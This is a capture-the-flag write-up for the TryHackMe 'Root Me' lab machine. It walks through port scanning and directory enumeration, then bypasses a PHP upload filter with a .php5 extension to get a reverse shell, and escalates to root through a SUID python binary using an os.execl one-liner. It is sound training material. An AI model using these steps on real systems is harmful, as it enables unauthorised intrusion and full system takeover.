---
title: "THM - Root Me"
author: NiBi
lang: "en"
categories : ['Try Hack Me']
tags : ['CTF', 'THM','easy','SUID','python']
titlepage: true
toc: true
toc-own-page: true
---

# Nmap

```shell
└─$ nmap -A 10.10.103.188 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-05 15:21 EDT
Nmap scan report for 10.10.103.188
Host is up (0.032s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: HackIT - Home
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 363.73 seconds
```
# Enumeration
The index page shows the text “Can you root me ?”

I run dirsearch to find hidden directories

```shell
└─$ dirsearch -u http://10.10.103.188/
jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/kali/.dirsearch/reports/10.10.103.188/-_22-06-05_15-30-52.txt

Error Log: /home/kali/.dirsearch/logs/errors-22-06-05_15-30-52.log

Target: http://10.10.103.188/

[15:30:52] Starting: 
[15:30:55] 301 -  311B  - /js  ->  http://10.10.103.188/js/                                                
[15:31:19] 301 -  312B  - /css  ->  http://10.10.103.188/css/               
[15:31:34] 301 -  314B  - /panel  ->  http://10.10.103.188/panel/           
[15:31:50] 301 -  316B  - /uploads  ->  http://10.10.103.188/uploads/       
                                                                             
Task Completed
```
 
Interesting ! We got an uploads directory and a /panel
 
On the /panel we can upload files, i tried to upload a text file and it's worked.
All uploaded files are available in /uploads/
 
Let's try to upload a php file.

 
Have been to [revshells](https://www.revshells.com) to gen a php reverse shell
 
 
I have a message in Portuguese “PHP não é permitido!” 
So we can't upload PHP files.
 
Let's try to bypass this security

First of all, we can try to replace the extension with PHP5. If the server simply checks the file extension and blocks the sending if it's a PHP file then with PHP5 as extension it might allow it. Let's test this


BINGO ! 
The file was upload ! 

Let's start the pwncat listener : 
```shell
─$ pwncat-cs  -lp 4444 
```

Go to upload/shell.php5

Andddd perfect ! We have now a reverse shell 

# Privilege escalation

checking /home/ we see that we have two users :\
-rootme\
-test

In rootme's directory we have .sudo_as_admin_successful so hijack rootme's account might be interesting

We have user.txt /var/www/user.txt

```shell
(remote)www-data@rootme:/tmp$cat  /var/www/user.txt
[redacted]
```

On /html/ we have Website.zip 

I downloaded it.

There's nothing special inside

We have to check 4 things for privilege escalation: 

-sudo -l (impossible because we do not have www-data's password) \
-Crontab (Nothing here) \
-Write access (All is fine)\
-SUID (Go !)

Who's there in the SUID ?

```shell
(remote) www-data@rootme:/var$ find / -perm /4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/bin/mount
/bin/su
/bin/fusermount
/bin/ping
/bin/umount
```

Is there a strange program ? Of course, yes ! Python is a SUID file !

If we start a shell with python , the shell will be started as root.

Perfect !

Going to [GTFOBIN](https://gtfobins.github.io/) we see how to use SUID to get root with python
Simply copy&paste this command :

```shell
(remote) www-data@rootme:/tmp$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
(remote)root@rootme:/tmp$ whoami
root
(remote)root@rootme:/tmp$
```
Voila, we are root

```shell
(remote)root@rootme:/tmp$ cat /root/root.txt
[redacted]
```

